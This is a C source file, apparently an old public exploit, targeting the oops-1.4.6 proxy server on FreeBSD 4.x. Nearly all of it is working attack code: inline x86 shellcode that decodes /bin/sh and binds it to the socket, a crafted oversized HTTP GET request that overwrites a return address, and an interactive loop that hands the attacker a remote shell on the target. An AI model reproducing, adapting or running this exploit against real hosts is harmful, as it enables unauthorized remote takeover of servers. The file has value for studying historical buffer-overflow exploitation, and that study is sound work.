/*--oopz.c---//-------------r-3-m-0-t-3---------------\\-------------*

 TARGET :       oops-1.4.6 (one russi4n proxy-server)
 CLASS  :       remote
 0S     :       FreeBSD 4.(0 - 2)
 AUTH0R :       diman
 VEND0R :       wanna payment for support. I'm not doing his job, yeh?
 DATE   :       7-11-2k
 N0TE   :       xploit was coded for fun only.
 GREETS :       &y, fm, JU$ (all for be a gOod guys)
*/

#define BUFADDR         0xbfafe55f      // ret
#define OFFSET2         450             // second copy
#define RETOFF          1363            // ip offset

#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>

/*
   I found two offsets where our shellcode can be placed.
   Since ret value is hardcoded, we should use two copies
   of shellcode. But last part of the second copy can be
   corrupted during procedure processing. Solution is to
   check current offset of the shellcode and jump from
   second copy to the first one. Something like v1r11 :)
   Also we avoids large letters in the shellcode
   and some other characters. We simple dup2(33,0) before
   execve, so be sure you are only connected if you don't
   wanna provide sh3ll for someone else =)   Enough...
*/


int
shellcode(char* buf) {
__asm__("
        call    ne0;
ne0:    popl    %eax;
        nop;
        nop;
        LEN1 = sh - ne0 ;
        leal    LEN1(%eax),%eax;
        pushl   %eax;
        pushl   8(%ebp);
        call    strcpy;
        addl    $8,%esp;
        jmp     done;


//-----s-h-e-l-l-c-o-d-e---s-t-a-r-t-s---h-e-r-e--------//

sh:     .fill 6,1,0x90;         // magic nops
        jmp     me;
retme:  popl    %esi;
        nop;
        movl    %esi,%eax;
        DELTA = huh - sh - 450;
        negl    %eax;
        leal    DELTA(%eax),%eax;
        negl    %eax;
        movl    (%eax),%ebx;
        cmpl    $0x90909090,%ebx;
        je      huh;            // we are in the first copy yet
        movl    %esi,%eax;      // jump to first copy
        leal    -450(%eax),%eax;
        jmp     *%eax;
me:     call    retme;
        
huh:    .fill   5,1,0x90;       
        jmp     call0;          // just one more (we not shure where we are)
ret0:   popl    %esi;
        movl    (%esi),%ebx;    // decrypt /bin/sh
        subl    $0x30303030,%ebx;
        movl    %ebx,(%esi);
        movl    4(%esi),%ebx;
        subl    $0x30303030,%ebx;
        movl    %ebx,4(%esi);
        xorl    %eax,%eax;
        movl    %esi,%edi;
        negl    %edi;
        leal    -7(%edi),%edi;
        negl    %edi;
        movb    %al,(%edi);     // end it with 0
        jmp     prep;

call0:  call    ret0;   
        .byte   0x5f,0x92,0x99,0x9e,0x5f,0xa3,0x98,0xee,0x03; /* /bin/sh */

dup2:   leal    -4(%esp),%esp;
        movl    %ecx,(%esp);
        leal    -4(%esp),%esp;
        movl    $-33,%eax;
        negl    %eax;
        movl    %eax,(%esp);
        movl    $-0x5a,%eax;
        negl    %eax;
        leal    -4(%esp),%esp;  
        int     $0x80;
        negl    %esp;
        leal    -0xc(%esp),%esp;
        negl    %esp;
        ret;

prep:   xorl    %ecx,%ecx;
        call    dup2;
        movb    $1,%cl;
        call    dup2;
        movb    $2,%cl;
        call    dup2;

        xorl    %eax,%eax;
        leal    -4(%esp),%esp;
        movl    %eax,(%esp);    // 0
        leal    -4(%esp),%esp;  
        movl    %esi,(%esp);    // name
        movl    %esp,%edi;
        leal    -4(%esp),%esp;  
        movl    %eax,(%esp);    // envp
        leal    -4(%esp),%esp;  
        movl    %edi,(%esp);    // av[]
        leal    -4(%esp),%esp;
        movl    %esi,(%esp);    // name
        movb    $0x3b,%al;      // execve
        leal    -4(%esp),%esp;
        int     $0x80;
        xorl    %eax,%eax;
        movl    %eax,(%esp);
        movl    %eax,%ebx;
        movb    $1,%al;         // exit
        leal    -4(%esp),%esp;
        int     $0x80;
        nop;                    // hip
        nop;                    // hop
        .byte   0x00;
done:;
");
}


int res(char*,struct sockaddr_in *);
void spawned_shell(int sock);


main(int ac, char** av){
#define SZ      0x2000
#define FIL     0xbf
        char buf[SZ],buf2[SZ],*pc,c;
        int i,sock;
        struct sockaddr_in sin;         
        short port=3128;
        unsigned *pu;
        memset(buf,FIL,SZ);
        shellcode(buf);
        buf[strlen(buf)]=FIL;
        pc=&buf[OFFSET2];
        shellcode(pc);
        pc+=strlen(pc);
        *pc=FIL;
        pu=(unsigned*)&buf[RETOFF];
        *pu=BUFADDR;
        buf[RETOFF+4]=0;
        strcpy(buf2,"GET http://p");
        strcat(buf2,buf);
        strcat(buf2," HTTP/1.0\r\n\r\n");
        fprintf(stderr,"oops-1.4.6 remote xpl0it for 4.x by diman.\n");
        fprintf(stderr,"use for educational purpose only.\n");
        if(ac<2) {
                fprintf(stderr,"usage: ./oopz target_host [port, def=3128]\n");
                exit(0);
        }
        pc=av[1];
        if(ac>2) port=atoi(av[2]);
        if(!res(pc,&sin)) {
                fprintf(stderr,"can't resolve %s\n",pc);
                exit(0);
        }
        sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
        sin.sin_port=htons(port);       
        if(connect(sock,(struct sockaddr*)&sin,sizeof(struct sockaddr))==-1) {
                fprintf(stderr,"can't connect %s:%d\n",pc,port);
                exit(0);
        }
        fprintf(stderr,"Connected. Sending surprise...\n");
        send(sock,buf2,strlen(buf2),0);
        spawned_shell(sock);
}


int res(char* host,struct sockaddr_in * ps)
{
        struct hostent *he;
        bzero(ps,sizeof(struct sockaddr_in));
        ps->sin_family=AF_INET;
        ps->sin_len=sizeof(struct sockaddr_in);
        if(!inet_aton(host,&ps->sin_addr))
        {       
                he=gethostbyname2(host,AF_INET);
                if(!he) return 0;
                memcpy(&ps->sin_addr,he->h_addr_list[0],sizeof(struct in_addr));
        }
        return 1;
}



/*
        Next was ripped from wildcoyote's gopher sploit.
*/
void spawned_shell(int sock){
        char buf[1024];
        fd_set rset;
        int i;
while (1)
 {
        FD_ZERO(&rset);
        FD_SET(sock,&rset);
        FD_SET(STDIN_FILENO,&rset);
        select(sock+1,&rset,NULL,NULL,NULL);
        if (FD_ISSET(sock,&rset)) {
                i=read(sock,buf,1024);
                if (i <= 0){
                        fprintf(stderr,"Connection lost.\n");
                        exit(0);
                }
                buf[i]=0;
                puts(buf);
        }
        if (FD_ISSET(STDIN_FILENO,&rset))
        {
                i=read(STDIN_FILENO,buf,1024);
                if (i>0){
                        buf[i]=0;
                        if(write(sock,buf,i)<0){
                                fprintf(stderr,"Connection lost.\n");
                                exit(0);
                        }
                }
        }
 }
}
/*---------------------e-n-d---o-f---o-o-p-z-.-c------------------*/
